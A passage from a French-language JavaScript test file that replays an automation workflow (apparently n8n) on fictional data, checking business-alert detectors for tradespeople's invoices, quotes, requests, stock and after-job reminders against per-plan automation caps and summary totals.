    r = await run({ 'Lire reglages du pilote': [pilote(SIGNATURE, TOUS_TYPES, false)], 'Lire devis': [devis({ artisan_id: SIGNATURE })] }); seul('4 M3 pilote coupé (types cochés)', r, 4, `devis_sans_reponse:${u(200)}:j3`, { niveau: 2 })
    r = await run({ ...PILOTE_SIGNATURE, 'Lire comptes': COMPTES.map((a) => a.id === SIGNATURE ? { ...a, leads_pause: true } : a), 'Lire devis': [devis({ artisan_id: SIGNATURE })] }); seul('4 M3 pause des demandes', r, 4, `devis_sans_reponse:${u(200)}:j3`, { niveau: 2 })
    // Rang 8 : une carte refusée (même outil, même objet, 7 derniers jours) fait taire le constat ; une autre ne le touche pas.
    const refus = (o) => ({ 'Lire cartes refusees': [{ id: u(970), artisan_id: STUDIO, outil: 'relancer_devis', statut: 'refusee', objet_id: u(200), maj_le: horodate(2), ...o }] })
    r = await run({ ...refus(), 'Lire devis': [devis()] }); rien('4 rang 8 carte refusée', r, 4)
    r = await run({ ...refus({ artisan_id: SIGNATURE }), 'Lire devis': [devis()] }); seul('4 rang 8 refus d’un autre compte', r, 4, `devis_sans_reponse:${u(200)}:j3`)
    r = await run({ ...refus({ outil: 'envoyer_devis' }), 'Lire devis': [devis()] }); seul('4 rang 8 refus d’un autre outil', r, 4, `devis_sans_reponse:${u(200)}:j3`)
    r = await run({ ...refus({ statut: 'executee' }), 'Lire devis': [devis()] }); seul('4 rang 8 carte exécutée (pas un refus)', r, 4, `devis_sans_reponse:${u(200)}:j3`)

    // n° 5 — coupé
    r = await run({ 'Lire factures': [facture(), facture({ id: u(101), date_echeance: jourMoins(60) })], 'Lire devis': [devis()] })
    rien('5 coupé', r, 5)
    const d5 = r.parNoeud['Détecteur 05 facture jamais envoyée (coupé)']?.[0]?.constats ?? []
    const d4 = r.parNoeud['Détecteur 04 devis sans réponse']?.[0]?.constats ?? []
    if (JSON.stringify(d5) !== JSON.stringify(d4)) ko('5 coupé : le nœud doit rendre ses entrées telles quelles')

    // n° 6 — demande sans réponse
    r = await run({ 'Lire demandes': [demande()] }); seul('6 J+1 pile', r, 6, `demande_sans_reponse:${u(300)}:j1`, { niveau: 2 })
    r = await run({ 'Lire demandes': [demande({ created_at: horodate(0) })] }); rien('6 le jour même', r, 6)
    r = await run({ 'Lire demandes': [demande({ created_at: horodate(3) })] }); seul('6 étape J+3', r, 6, `demande_sans_reponse:${u(300)}:j3`)
    r = await run({ 'Lire demandes': [demande({ statut: 'repondu' })] }); rien('6 répondue', r, 6)
    r = await run({ ...PILOTE_SIGNATURE, 'Lire demandes': [demande({ artisan_id: SIGNATURE })], 'Lire reglages de la plateforme': [{ artisan_id: SIGNATURE, mode_reponse: 'auto' }] }); seul('6 Signature auto, pilote activé', r, 6, `demande_sans_reponse:${u(300)}:j1`, { niveau: 3 })
    r = await run({ ...PILOTE_SIGNATURE, 'Lire demandes': [demande({ artisan_id: SIGNATURE })], 'Lire reglages de la plateforme': [{ artisan_id: SIGNATURE, mode_reponse: 'assistee' }] }); seul('6 Signature assistée', r, 6, `demande_sans_reponse:${u(300)}:j1`, { niveau: 2 })
    r = await run({ 'Lire demandes': [demande()], 'Lire reglages de la plateforme': [{ artisan_id: STUDIO, mode_reponse: 'auto' }] }); seul('6 Studio en « auto » reste à 2', r, 6, `demande_sans_reponse:${u(300)}:j1`, { niveau: 2 })
    r = await run({ ...PILOTE_SIGNATURE, 'Lire demandes': [demande({ artisan_id: SIGNATURE, prise_en_main: true })], 'Lire reglages de la plateforme': [{ artisan_id: SIGNATURE, mode_reponse: 'auto' }] }); seul('6 M3 demande prise en main', r, 6, `demande_sans_reponse:${u(300)}:j1`, { niveau: 2 })
    // M4 : « en_discussion » (depuis sa dernière mise à jour) et le statut vide sont des demandes sans réponse.
    r = await run({ 'Lire demandes': [demande({ statut: 'en_discussion', created_at: horodate(30), updated_at: horodate(1) })] }); seul('6 M4 en_discussion', r, 6, `demande_sans_reponse:${u(300)}:j1`)
    r = await run({ 'Lire demandes': [demande({ statut: null })] }); seul('6 M4 statut vide (non lue)', r, 6, `demande_sans_reponse:${u(300)}:j1`)
    r = await run({ 'Lire demandes': [demande({ statut: 'gagne' })] }); rien('6 M4 gagnée', r, 6)
    // M8 : plus rien au-delà de la dernière relance de conversation (10 jours).
    r = await run({ 'Lire demandes': [demande({ created_at: horodate(10) })] }); seul('6 M8 J+10 (borne)', r, 6, `demande_sans_reponse:${u(300)}:j3`)
    r = await run({ 'Lire demandes': [demande({ created_at: horodate(11) })] }); rien('6 M8 J+11', r, 6)
    r = await run({ 'Lire demandes': [demande({ created_at: horodate(200) })] }); rien('6 M8 demande morte depuis 200 jours', r, 6)

    // n° 7 — demande sans devis (jamais niveau 3)
    const tarif = { 'Lire tarifs': [{ id: u(901), artisan_id: STUDIO, actif: true }, { id: u(902), artisan_id: SIGNATURE, actif: true }] }
    r = await run({ ...tarif, 'Lire demandes': [demande({ urgence: 'urgent' })] }); seul('7 qualifiée', r, 7, `demande_sans_devis:${u(300)}:brouillon`, { niveau: 2 })
    r = await run({ 'Lire demandes': [demande({ urgence: 'urgent' })] }); rien('7 sans tarifs', r, 7)
    r = await run({ ...tarif, 'Lire demandes': [demande()] }); rien('7 non qualifiée', r, 7)
    r = await run({ ...tarif, 'Lire demandes': [demande({ type_chantier: 'Plomberie' })], 'Lire devis': [devis({ lead_id: u(300), statut: 'brouillon' })] }); rien('7 devis lié', r, 7)
    r = await run({ ...tarif, 'Lire demandes': [demande({ urgence: 'urgent', statut: 'perdu' })] }); rien('7 perdue', r, 7)
    r = await run({ ...tarif, ...PILOTE_SIGNATURE, 'Lire demandes': [demande({ artisan_id: SIGNATURE, urgence: 'urgent' })], 'Lire reglages de la plateforme': [{ artisan_id: SIGNATURE, mode_reponse: 'auto' }], 'Lire reglages des relances': [{ artisan_id: SIGNATURE, actif: true }] })
    seul('7 Signature tout coché : jamais 3', r, 7, `demande_sans_devis:${u(300)}:brouillon`, { niveau: 2 })
    r = await run({ ...tarif, 'Lire demandes': [demande({ urgence: 'urgent', statut: 'en_discussion' })] }); seul('7 M4 en_discussion', r, 7, `demande_sans_devis:${u(300)}:brouillon`)
    r = await run({ ...tarif, 'Lire demandes': [demande({ urgence: 'urgent', statut: null })] }); seul('7 M4 statut vide', r, 7, `demande_sans_devis:${u(300)}:brouillon`)
    r = await run({ ...tarif, 'Lire demandes': [demande({ urgence: 'urgent' })], 'Lire devis': [devis({ artisan_id: SIGNATURE, lead_id: u(300), statut: 'brouillon' })] }); seul('7 M2 devis d’un autre compte', r, 7, `demande_sans_devis:${u(300)}:brouillon`)

    // n° 8 — devis bientôt expiré
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(23), validite_jours: 30 })] }); seul('8 J-7 pile', r, 8, `devis_bientot_expire:${u(200)}:expire`, { jours: 7, montant_centimes: 80000 })
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(22), validite_jours: 30 })] }); rien('8 J-8', r, 8)
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(30), validite_jours: 30 })] }); seul('8 M8 dernier jour de validité', r, 8, `devis_bientot_expire:${u(200)}:expire`, { jours: 0 })
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(31), validite_jours: 30 })] }); rien('8 expiré', r, 8)
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(23), validite_jours: 30, statut: 'refuse' })] }); rien('8 refusé', r, 8)
    // M5 : le même devis n'est relancé qu'une fois : le n° 8 remplace le n° 4.
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(23), validite_jours: 30 })] }); rien('8 M5 le n° 4 se tait quand le n° 8 parle', r, 4)
    r = await run({ 'Lire devis': [devis({ envoye_le: horodate(23), validite_jours: 30 }), devis({ id: u(205), envoye_le: horodate(7) })] }); seul('8 M5 un autre devis garde son n° 4', r, 4, `devis_sans_reponse:${u(205)}:j7`)

    // n° 9 — stock sous le seuil
    const resa = { 'Lire chantiers': [chantier({ id: u(402), statut: 'en_cours', date_fin_reelle: null })], 'Lire reservations': [{ id: u(501), artisan_id: SIGNATURE, chantier_id: u(402), materiau_id: u(601), quantite: 5, statut: 'reserve' }], 'Lire materiaux': [{ id: u(601), artisan_id: SIGNATURE, seuil_alerte: 0 }] }
    r = await run({ ...resa, 'Lire stock': [{ id: u(701), materiau_id: u(601), quantite: 2 }] }); seul('9 réservation qui manque', r, 9, `stock_sous_seuil:${u(402)}:chantier`, { niveau: 2 })
    r = await run({ ...resa, 'Lire stock': [{ id: u(701), materiau_id: u(601), quantite: 6 }] }); rien('9 stock suffisant', r, 9)
    r = await run({ ...resa, 'Lire stock': [{ id: u(701), materiau_id: u(601), quantite: 2 }], 'Lire commandes': [{ id: u(61), artisan_id: SIGNATURE, statut: 'commandee', chantier_id: u(402) }] }); rien('9 commande passée', r, 9)
    r = await run({ ...resa, 'Lire stock': [{ id: u(701), materiau_id: u(601), quantite: 2 }], 'Lire commandes': [{ id: u(61), artisan_id: ENTREPRISE, statut: 'commandee', chantier_id: u(402) }] }); seul('9 M2 commande d’un autre compte', r, 9, `stock_sous_seuil:${u(402)}:chantier`)
    r = await run({ 'Lire materiaux': [{ id: u(602), artisan_id: STUDIO, seuil_alerte: 3 }], 'Lire stock': [{ id: u(702), materiau_id: u(602), quantite: 3 }] }); seul('9 Studio au seuil pile', r, 9, `stock_sous_seuil:${u(602)}:seuil`, { niveau: 2 })
    r = await run({ 'Lire materiaux': [{ id: u(602), artisan_id: STUDIO, seuil_alerte: 3 }], 'Lire stock': [{ id: u(702), materiau_id: u(602), quantite: 4 }] }); rien('9 Studio au-dessus du seuil', r, 9)

    // n° 10 — demande d'avis (M7 : comme propositions, lib/apresChantier.ts:135-149)
    const avis = { 'Lire apres chantier': [{ artisan_id: SIGNATURE, avis: true, entretien: false, actif_depuis: null }] }
    r = await run({ ...avis, 'Lire chantiers': [chantier()] }); seul('10 J+2 pile', r, 10, `demande_avis:${u(400)}:avis`, { jours: 2, niveau: 2 })
    r = await run({ ...avis, 'Lire chantiers': [chantier({ date_fin_reelle: jourMoins(1) })] }); rien('10 J+1', r, 10)
    r = await run({ ...avis, 'Lire chantiers': [chantier({ date_fin_reelle: jourMoins(14) })] }); seul('10 activé ce jour : fini 14 jours avant', r, 10, `demande_avis:${u(400)}:avis`)
    r = await run({ ...avis, 'Lire chantiers': [chantier({ date_fin_reelle: jourMoins(15) })] }); rien('10 activé ce jour : fini 15 jours avant', r, 10)
    const avisAncien = { 'Lire apres chantier': [{ artisan_id: SIGNATURE, avis: true, entretien: false, actif_depuis: horodate(100) }] }
    r = await run({ ...avisAncien, 'Lire chantiers': [chantier({ date_fin_reelle: jourMoins(30) })] }); seul('10 M7 activé il y a 100 jours : fini il y a 30 jours', r, 10, `demande_avis:${u(400)}:avis`)
    r = await run({ ...avisAncien, 'Lire chantiers': [chantier({ date_fin_reelle: jourMoins(120) })] }); rien('10 M7 fini avant l’activation − 14 jours', r, 10)
    r = await run({ ...avis, 'Lire chantiers': [chantier({ date_fin_reelle: null, maj_le: horodate(3) })] }); rien('10 M7 sans date de fin réelle (aucun repli sur maj_le)', r, 10)
    r = await run({ ...avis, 'Lire chantiers': [chantier()], 'Lire rappels': [rappel({ type: 'demande_avis', cle: `avis:${u(400)}`, fait_le: horodate(0) })] }); rien('10 M7 rappel « avis » déjà fait', r, 10)
    r = await run({ ...avis, 'Lire chantiers': [chantier()], 'Lire rappels': [rappel({ type: 'demande_avis', cle: `avis:${u(400)}` })] }); seul('10 M7 rappel « avis » posé, pas encore fait', r, 10, `demande_avis:${u(400)}:avis`)
    r = await run({ 'Lire chantiers': [chantier()] }); rien('10 avis non coché', r, 10)
    r = await run({ 'Lire apres chantier': [{ artisan_id: STUDIO, avis: true, entretien: false, actif_depuis: null }], 'Lire chantiers': [chantier({ artisan_id: STUDIO })] }); rien('10 Studio sans CRM', r, 10)

    // n° 11 — réponse à une relance d'impayé (plan §9, n° 11)
    r = await run({ 'Lire factures': [facture()], 'Lire arrets de relance': [arret({ le: horodate(4) })] })
    seul('11 arrêtée par une réponse', r, 11, `reponse_impaye:${u(100)}:r${jourMoins(4).replace(/-/g, '')}`, { montant_centimes: 100000, jours: 4, niveau: 2 }); rien('11 le n° 1 se tait sur la même facture', r, 1)
    r = await run({ 'Lire factures': [facture()], 'Lire arrets de relance': [arret({ reprise_le: horodate(1) })] }); rien('11 reprise', r, 11)
    r = await run({ 'Lire factures': [facture()], 'Lire arrets de relance': [arret({ raison: 'artisan' })] }); rien('11 arrêtée par l’artisan', r, 11)
    r = await run({ 'Lire factures': [facture({ payee_le: JOUR })], 'Lire arrets de relance': [arret()] }); rien('11 payée', r, 11)
    r = await run({ 'Lire factures': [facture({ statut: 'annulee' })], 'Lire arrets de relance': [arret()] }); rien('11 annulée', r, 11)
    r = await run({ 'Lire factures': [facture({ avoir_de: u(150) })], 'Lire arrets de relance': [arret()] }); rien('11 avoir', r, 11)
    r = await run({ 'Lire factures': [facture()], 'Lire arrets de relance': [arret({ artisan_id: SIGNATURE })] }); rien('11 M2 arrêt d’un autre compte', r, 11)
    r = await run({ 'Lire factures': [facture({ artisan_id: HORS })], 'Lire arrets de relance': [arret({ artisan_id: HORS })] }); rien('11 compte hors offre', r, 11)
    r = await run({ ...PILOTE_SIGNATURE, 'Lire factures': [facture({ artisan_id: SIGNATURE })], 'Lire arrets de relance': [arret({ artisan_id: SIGNATURE })], 'Lire reglages des relances': [{ artisan_id: SIGNATURE, actif: true }] })
    seul('11 Signature tout coché : jamais 3', r, 11, `reponse_impaye:${u(100)}:r${jourMoins(1).replace(/-/g, '')}`, { niveau: 2, outil: 'relancer_facture' })

    // n° 12 — entretien à proposer (plan §9, n° 12)
    const fini = { 'Lire chantiers': [chantier({ date_fin_reelle: jourMoins(350) })] }
    r = await run({ ...ENTRETIEN, ...fini, 'Lire rappels': [rappel()] }); seul('12 rappel échu', r, 12, `entretien_a_proposer:${u(400)}:e1`, { jours: 1, niveau: 2, outil: 'envoyer_rappel_entretien' })
    r = await run({ ...ENTRETIEN, ...fini, 'Lire rappels': [rappel({ echeance: JOUR })] }); seul('12 échéance ce jour', r, 12, `entretien_a_proposer:${u(400)}:e1`, { jours: 0 })
    r = await run({ ...ENTRETIEN, ...fini, 'Lire rappels': [rappel({ echeance: '2026-11-11' })] }); rien('12 échéance à venir', r, 12)
    r = await run({ ...ENTRETIEN, ...fini, 'Lire rappels': [rappel({ envoye_le: horodate(0) })] }); rien('12 déjà envoyé', r, 12)
    r = await run({ ...ENTRETIEN, ...fini, 'Lire rappels': [rappel({ fait_le: horodate(0) })] }); rien('12 déjà fait', r, 12)
    r = await run({ ...ENTRETIEN, ...fini, 'Lire rappels': [rappel({ origine: 'artisan' })] }); rien('12 rappel posé par l’artisan', r, 12)
    r = await run({ ...ENTRETIEN, ...fini, 'Lire rappels': [rappel({ cle: `entretien:${u(401)}:1` })] }); rien('12 clé d’un autre chantier', r, 12)
    r = await run({ ...fini, 'Lire rappels': [rappel()] }); rien('12 entretien non coché', r, 12)
    r = await run({ ...ENTRETIEN, 'Lire chantiers': [chantier({ statut: 'en_cours' })], 'Lire rappels': [rappel()] }); rien('12 chantier pas fini', r, 12)
    r = await run({ ...ENTRETIEN, 'Lire chantiers': [chantier({ artisan_id: ENTREPRISE })], 'Lire rappels': [rappel()] }); rien('12 M2 chantier d’un autre compte', r, 12)
    r = await run({ 'Lire apres chantier': [{ artisan_id: STUDIO, avis: false, entretien: true, actif_depuis: null }], 'Lire chantiers': [chantier({ artisan_id: STUDIO })], 'Lire rappels': [rappel({ artisan_id: STUDIO })] }); rien('12 Studio sans CRM', r, 12)
    r = await run({ ...ENTRETIEN, ...fini, ...PILOTE_SIGNATURE, 'Lire rappels': [rappel()] }); seul('12 Signature pilote activé : jamais 3', r, 12, `entretien_a_proposer:${u(400)}:e1`, { niveau: 2 })
    r = await run({ ...ENTRETIEN, ...fini, 'Lire rappels': [rappel()], 'Lire cartes refusees': [{ id: u(971), artisan_id: SIGNATURE, outil: 'envoyer_rappel_entretien', statut: 'refusee', objet_id: u(400), maj_le: horodate(1) }] }); rien('12 rang 8 carte refusée', r, 12)

    // Règles transverses, sur un jeu riche : Studio ≤ 2 ; n° 7 jamais 3 ; aucun champ personnel ; clé bien formée ; bilan cohérent.
    const riche = {
      ...tarif,
      'Lire apres chantier': [{ artisan_id: SIGNATURE, avis: true, entretien: true, actif_depuis: null }],
      'Lire factures': [facture(), facture({ id: u(102), artisan_id: SIGNATURE }), facture({ id: u(103), artisan_id: ENTREPRISE }), facture({ id: u(104), artisan_id: ENTREPRISE })],
      'Lire arrets de relance': [arret({ facture_id: u(104), artisan_id: ENTREPRISE })],
      'Lire devis': [devis(), devis({ id: u(202), artisan_id: SIGNATURE }), devis({ id: u(203), artisan_id: ENTREPRISE, statut: 'accepte', acompte_pct: 20 }), devis({ id: u(206), statut: 'accepte', total_ttc: 900 })],
      'Lire demandes': [demande({ urgence: 'urgent' }), demande({ id: u(302), artisan_id: SIGNATURE, urgence: 'urgent' })],
      'Lire chantiers': [chantier(), chantier({ id: u(405), date_fin_reelle: jourMoins(300) })],
      'Lire rappels': [rappel({ chantier_id: u(405), cle: `entretien:${u(405)}:1` })],
      'Lire reglages des relances': [{ artisan_id: STUDIO, actif: true }, { artisan_id: SIGNATURE, actif: true }, { artisan_id: ENTREPRISE, actif: true }],
      'Lire reglages de la plateforme': [{ artisan_id: STUDIO, mode_reponse: 'auto' }, { artisan_id: SIGNATURE, mode_reponse: 'auto' }, { artisan_id: ENTREPRISE, mode_reponse: 'auto' }],
      'Lire reglages du pilote': [pilote(STUDIO), pilote(SIGNATURE), pilote(ENTREPRISE)],
    }
    r = await run(riche)
    if (!r.constats.length) ko('jeu riche : aucun constat')
    for (const n of [1, 2, 3, 4, 6, 7, 10, 11, 12]) if (!de(r, n).length) ko(`jeu riche : le n° ${n} ne parle pas`)
    for (const c of r.constats) {
      if (c.offre === 'studio' && c.niveau > 2) ko(`Studio au niveau ${c.niveau} : ${c.cle}`)
      if ([7, 11, 12].includes(c.numero) && c.niveau >= 3) ko(`n° ${c.numero} au niveau 3 : ${c.cle}`)
      if (c.numero === 5) ko(`n° 5 a sorti un constat : ${c.cle}`)
      if (![1, 2, 3].includes(c.niveau)) ko(`niveau hors de 1-3 : ${c.cle}`)
      if (!/^[a-z_]+:[0-9a-f-]{36}:[a-z0-9_]+$/.test(c.cle)) ko(`clé mal formée : ${c.cle}`)
      const champs = []
      const parcourir = (o, p = '') => { for (const [k, v] of Object.entries(o)) { champs.push(p + k); if (v && typeof v === 'object' && !Array.isArray(v)) parcourir(v, p + k + '.') } }
      parcourir(c)
      for (const k of champs) if (INTERDIT.test(k)) ko(`constat porteur d'un champ interdit (${k}) : ${c.cle}`)
      if (['creer_facture', 'creer_facture_libre'].includes(c.outil) && c.niveau > 2) ko(`une facture partirait seule : ${c.cle}`)
      if (OUTILS_JAMAIS_AUTO.includes(c.outil) && c.niveau > 2) ko(`geste §3.2 au niveau 3 : ${c.cle}`)
    }
    if (!r.constats.some((c) => c.offre === 'signature' && c.niveau === 3)) ko('jeu riche : aucun niveau 3 en Signature (le juge ne verrait plus rien)')
    const ORDRE_BILAN = [1, 11, 2, 3, 4, 8, 5, 6, 7, 9, 10, 12, 0]
    if (r.bilan.map((b) => b.numero).join(',') !== ORDRE_BILAN.join(',')) ko(`bilan : lignes ${ORDRE_BILAN.join(',')} attendues dans cet ordre (${r.bilan.map((b) => b.numero).join(',')})`)
    for (const b of r.bilan) {
      const cles = Object.keys(b).sort().join(',')
      if (cles !== 'detecteur,mode,montant_total_centimes,nombre,numero,par_niveau') ko(`bilan n° ${b.numero} : champs inattendus (${cles})`)
      if (b.mode !== 'simulation') ko('bilan hors simulation')
      if (b.numero === 0) continue
      const l = r.constats.filter((c) => c.numero === b.numero)
      const somme = l.reduce((s, c) => s + (c.montant_centimes || 0), 0)
      if (b.nombre !== l.length || b.montant_total_centimes !== somme) ko(`bilan n° ${b.numero} incohérent`)
    }
    // M5 : le total de l'argent qui dort compte chaque pièce une fois, à son plus haut montant.
    const pieces = new Map()
    for (const c of r.constats) if (c.argent && c.montant_centimes > 0) { const k = `${c.artisan_id}|${c.argent.type}|${c.argent.id}`; pieces.set(k, Math.max(pieces.get(k) ?? 0, c.montant_centimes)) }
    const total = r.bilan.find((b) => b.numero === 0)
    const attenduTotal = [...pieces.values()].reduce((s, v) => s + v, 0)
    if (!total || total.nombre !== pieces.size || total.montant_total_centimes !== attenduTotal) ko(`bilan : argent qui dort ${total?.montant_total_centimes} (${total?.nombre} pièces), ${attenduTotal} (${pieces.size}) attendu`)
    // 032-010, annexe B (M5) : devis de 2 000 € accepté avec 30 % d'acompte : n° 2 et n° 3 le comptent tous deux, le total une seule fois.
    r = await run({ 'Lire devis': [devis({ statut: 'accepte', total_ttc: 2000, acompte_pct: 30 })] })
    const t = r.bilan.find((b) => b.numero === 0)
    if (de(r, 2).length !== 1 || de(r, 3).length !== 1 || t?.montant_total_centimes !== 200000 || t?.nombre !== 1) ko(`M5 : un devis de 2 000 € compté ${t?.montant_total_centimes} centimes dans l'argent qui dort (200000 attendu)`)
    // Idempotence : deux passages sur les mêmes données donnent les mêmes clés.
    const r1 = await run(riche)
    const r2 = await run(riche)
    if (r2.constats.map((c) => c.cle).join() !== r1.constats.map((c) => c.cle).join()) ko('deux passages identiques ne donnent pas les mêmes clés')
  } catch (err) {
    ko(`exception pendant le rejeu : ${err.message}`)
  }
  return e
}

// ─── 4. É2 : le test par propriété des plafonds ───────────────────────────────────────────────────────────────────────────────
// Pour chaque offre (Studio, Signature, Entreprise) × impayés cochés ou non × réponse `auto` ou `assistee`, un compte fictif ; pour
// chaque compte, de quoi déclencher chaque détecteur à plusieurs étapes et pour des montants de 1 € à 100 000 €. Le cas doit
// déclencher (sinon la propriété ne prouverait rien), et chaque constat passe par `controler` : niveau ≤ plafond(offre, détecteur).
const OFFRES = ['studio', 'signature', 'entreprise']
const MONTANTS = [1, 999.99, 1000, 12345.67, 100000]
const JOURS_PROPRIETE = ['2026-11-10', '2026-03-30'] // un jour ordinaire, et le lendemain du passage à l'heure d'été
function jeuPropriete(jour) {
  const jm = (n) => jourMoins(n, jour)
  const hd = (n) => horodate(n, jour)
  const d = { 'Lire comptes': [], 'Lire factures': [], 'Lire devis': [], 'Lire demandes': [], 'Lire chantiers': [], 'Lire reservations': [], 'Lire materiaux': [],
    'Lire stock': [], 'Lire relances impayes': [], 'Lire reglages des relances': [], 'Lire reglages de la plateforme': [], 'Lire tarifs': [], 'Lire apres chantier': [],
    'Lire arrets de relance': [], 'Lire rappels': [], 'Lire reglages du pilote': [] }
  const attendus = [] // { numero, id, compte, declenche }
  let n = 10000
  const id = () => u(++n)
  for (const offre of OFFRES) for (const impayes of [true, false]) for (const reponse of ['auto', 'assistee']) for (const piloteActif of [true, false]) {
    const a = id()
    const titre = `${offre}, impayés ${impayes ? 'cochés' : 'non cochés'}, réponse ${reponse}, pilote ${piloteActif ? 'activé' : 'coupé'}`
    const crm = peut(offre, 'crm')
    d['Lire comptes'].push({ id: a, plan: offre })
    if (impayes) d['Lire reglages des relances'].push({ artisan_id: a, actif: true, jours: [3, 10, 21] })
    d['Lire reglages de la plateforme'].push({ artisan_id: a, mode_reponse: reponse })
    d['Lire tarifs'].push({ id: id(), artisan_id: a, actif: true })
    d['Lire apres chantier'].push({ artisan_id: a, avis: true, entretien: true, actif_depuis: null })
    if (piloteActif) d['Lire reglages du pilote'].push(pilote(a))
    const attendre = (numero, objet, etape, declenche = true) => attendus.push({ numero, id: objet, compte: titre, etape, declenche })
    for (const montant of MONTANTS) {
      // n° 1 : J+3 ; J+10 après la relance de rang 1 ; J+21 après les rangs 1 et 2.
      for (const [retard, rangs] of [[3, []], [10, [1]], [21, [1, 2]]]) {
        const f = id()
        d['Lire factures'].push(facture({ id: f, artisan_id: a, date_echeance: jm(retard), total_ttc: montant }))
        for (const r of rangs) d['Lire relances impayes'].push({ id: id(), artisan_id: a, facture_id: f, rang: r, jour: jm(retard - 7 * r), statut: 'envoyee' })
        attendre(1, f, `J+${retard}, ${montant} €`)
      }
      // n° 2 : devis accepté sans facture de solde ; avec le CRM, il faut le chantier terminé (le constat porte le chantier).
      const d2 = id()
      d['Lire devis'].push(devis({ id: d2, artisan_id: a, statut: 'accepte', total_ttc: montant, accepte_le: hd(5) }))
      if (crm) { const c = id(); d['Lire chantiers'].push(chantier({ id: c, artisan_id: a, devis_id: d2, date_fin_reelle: jm(3), maj_le: hd(3) })); attendre(2, c, `${montant} €`) } else attendre(2, d2, `${montant} €`)
      // n° 3 : acompte de 10, 30 et 100 %.
      for (const pct of [10, 30, 100]) { const d3 = id(); d['Lire devis'].push(devis({ id: d3, artisan_id: a, statut: 'accepte', acompte_pct: pct, total_ttc: montant, accepte_le: hd(1) })); attendre(3, d3, `${pct} % de ${montant} €`) }
      // n° 4 : J+3, J+7, J+14 ; n° 8 : il reste 7 jours, puis 1 jour.
      for (const age of [3, 7, 14]) { const d4 = id(); d['Lire devis'].push(devis({ id: d4, artisan_id: a, total_ttc: montant, envoye_le: hd(age), date_emission: jm(age), created_at: hd(age) })); attendre(4, d4, `J+${age}, ${montant} €`) }
      for (const age of [23, 29]) { const d8 = id(); d['Lire devis'].push(devis({ id: d8, artisan_id: a, total_ttc: montant, validite_jours: 30, envoye_le: hd(age), date_emission: jm(age), created_at: hd(age) })); attendre(8, d8, `reste ${30 - age} j, ${montant} €`) }
    }
    // n° 6 : J+1, J+3, J+10 ; n° 7 : demande qualifiée (urgence, puis type de chantier), compte avec un tarif actif.
    for (const age of [1, 3, 10]) { const l = id(); d['Lire demandes'].push(demande({ id: l, artisan_id: a, created_at: hd(age) })); attendre(6, l, `J+${age}`) }
    for (const q of [{ urgence: 'urgent' }, { type_chantier: 'Plomberie' }]) { const l = id(); d['Lire demandes'].push(demande({ id: l, artisan_id: a, created_at: hd(2), ...q })); attendre(7, l, Object.keys(q)[0]) }
    // n° 9 : avec le CRM, réservation d'un chantier ouvert qui manque ; sans lui, matériau au seuil.
    if (crm) {
      const c = id(), m = id()
      d['Lire chantiers'].push(chantier({ id: c, artisan_id: a, statut: 'en_cours', date_fin_reelle: null }))
      d['Lire materiaux'].push({ id: m, artisan_id: a, seuil_alerte: 0 })
      d['Lire reservations'].push({ id: id(), artisan_id: a, chantier_id: c, materiau_id: m, quantite: 5, statut: 'reserve' })
      d['Lire stock'].push({ id: id(), materiau_id: m, quantite: 2 })
      attendre(9, c, 'réservation')
    } else {
      const m = id()
      d['Lire materiaux'].push({ id: m, artisan_id: a, seuil_alerte: 3 })
      d['Lire stock'].push({ id: id(), materiau_id: m, quantite: 3 })
      attendre(9, m, 'seuil')
    }
    // n° 10 : chantier terminé à J+2 et J+10 ; sans le CRM, il doit se taire.
    for (const age of [2, 10]) { const c = id(); d['Lire chantiers'].push(chantier({ id: c, artisan_id: a, date_fin_reelle: jm(age), maj_le: hd(age) })); attendre(10, c, `J+${age}`, crm) }
    // n° 11 : une facture due dont la relance a été arrêtée par une réponse du client, par montant ; le n° 1 doit s'y taire.
    for (const montant of MONTANTS) { const f = id(); d['Lire factures'].push(facture({ id: f, artisan_id: a, date_echeance: jm(12), total_ttc: montant })); d['Lire arrets de relance'].push(arret({ facture_id: f, artisan_id: a, le: hd(2) })); attendre(11, f, `${montant} €`); attendus.push({ numero: 1, id: f, compte: titre, etape: 'arrêtée', declenche: false }) }
    // n° 12 : un rappel d'entretien échu sur un chantier terminé ; sans le CRM, il doit se taire.
    { const c = id(); d['Lire chantiers'].push(chantier({ id: c, artisan_id: a, date_fin_reelle: jm(340), maj_le: hd(340) })); d['Lire rappels'].push(rappel({ id: id(), artisan_id: a, chantier_id: c, cle: `entretien:${c}:1`, echeance: jm(5) })); attendre(12, c, 'rappel échu', crm) }
  }
  return { donnees: d, attendus }
}
async function proprietes(wf) {
  const e = []
  const ko = (m) => e.push(m)
  let constats = 0, cases = 0
  const parNiveau = { 1: 0, 2: 0, 3: 0 }
  try {
    for (const jour of JOURS_PROPRIETE) {
      const { donnees, attendus } = jeuPropriete(jour)
      const r = await passer(wf, donnees, jour)
      controler(`propriété du ${jour}`, donnees, r.constats, ko)
      constats += r.constats.length
      for (const c of r.constats) parNiveau[c.niveau] = (parNiveau[c.niveau] ?? 0) + 1
      if (r.constats.some((c) => c.numero === 5)) ko(`propriété du ${jour} : le n° 5 a sorti un constat`)
      for (const x of attendus) {
        cases++
        const l = r.constats.filter((c) => c.numero === x.numero && c.objet?.id === x.id)
        if (x.declenche && l.length !== 1) ko(`propriété du ${jour} : n° ${x.numero} (${x.compte}, ${x.etape}) : un constat attendu, ${l.length} obtenu(s)`)
        if (!x.declenche && l.length) ko(`propriété du ${jour} : n° ${x.numero} (${x.compte}, ${x.etape}) : rien attendu`)
      }
    }
    // La propriété ne vaut que si le niveau 3 existe : sinon un juge qui ne voit plus rien passerait pour sûr.
    if (!parNiveau[3]) ko('propriété : aucun niveau 3 sur tout le jeu (le juge ne verrait plus rien)')
  } catch (err) { ko(`propriété : exception pendant le rejeu : ${err.message}`) }
  STATS.proprietes = { cases, constats, parNiveau }
  return e
}
const STATS = {}

// ─── 5. Le jeu de l'essai n8n (test_workflow du lot L12) rejoué hors ligne ──────────────────────────────────────────────────
// Le jeu de l'essai n8n du lot L12 (032-019) : celui de l'exécution 320 (032-003), plus de quoi faire parler les n° 11 et 12, le pilote
// de M3 (activé pour les relances seulement) et une carte refusée (rang 8). Données FICTIVES, épinglées dans n8n par test_workflow ;
// ce jeu est recopié dans .orchestre/preuves/032-019/essai-n8n.json.
const A1 = u(1), A2 = u(2)
const DONNEES_ESSAI = {
